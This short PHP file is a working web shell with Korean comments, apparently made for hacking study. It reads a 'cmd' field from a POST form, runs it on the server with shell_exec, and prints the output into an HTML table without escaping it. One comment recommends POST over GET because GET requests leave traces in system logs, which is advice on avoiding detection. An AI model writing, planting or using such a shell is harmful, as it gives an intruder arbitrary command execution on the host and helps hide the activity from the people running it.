<?
    $page = $_SERVER["PHP_SELF"];      # _SERVER 슈퍼 변수 : (PHP_SELF)해당 페이지 URI 반환
    $cmd = $_POST["cmd"];
    if(!empty($cmd)) {
        $result = shell_exec($cmd);
        $result = str_replace("\n",'<br>', $result);
    }
?>

<!-- GET method는 시스템 로그에 기록이 남기 때문에 POST 추천-->
<form action="<?=$page?>" method="POST">
    <input type="text" name="cmd" value="<?=$cmd?>">
    <input type="submit" value="EXECUTE">
</form>
<hr>
<? if(!empty($cmd)) { ?>
    <table style="border: 1px solid black; background-color: black">
        <!-- tr: 행, td: 열-->
        <tr>
            <td style="color: white; font-size: 12px"><?=$result?></td>
        </tr>
    </table>
<? } ?>